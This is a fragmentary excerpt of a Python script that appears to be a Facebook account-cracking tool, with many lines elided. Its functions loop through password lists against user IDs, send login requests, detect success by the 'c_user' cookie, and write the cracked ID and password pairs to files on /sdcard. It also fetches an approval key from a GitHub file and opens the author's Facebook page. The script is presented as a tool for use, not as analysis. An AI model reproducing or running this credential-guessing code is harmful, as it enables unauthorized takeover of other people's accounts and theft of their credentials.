...
def menu_apikey():
  ...
  server = requests.get('https://raw.githubusercontent.com/SHEFAN00/game.py/main/game.txt').text
...
>=>    >=> >=>    >=> >=>       >=>        >=>      >=>  >=>    >>=> 
  ...
  os.system('xdg-open https://www.facebook.com/SHEFAN909')
  ...
  try:
    ...
    httpCaht = requests.get("https://github.com/MR-SHEFAN/approved99/blob/main/Testapproval.txt").text
...
def admin():
	...
	if bal =='2':
		...
		os.system('xdg-open https://www.facebook.com/SHEFAN.909');time.sleep(1)
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHEFAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                ccid = json.loads(lo);cid = ccid['uid']

                print(f'\r\33[1;92m [SHEFAN>OK] '+cid+' | '+ps+'\33[0;92m')
                ...
                open('/sdcard/SHEFAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\033[m[SHEFAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
...
def b(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SHEFAN-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
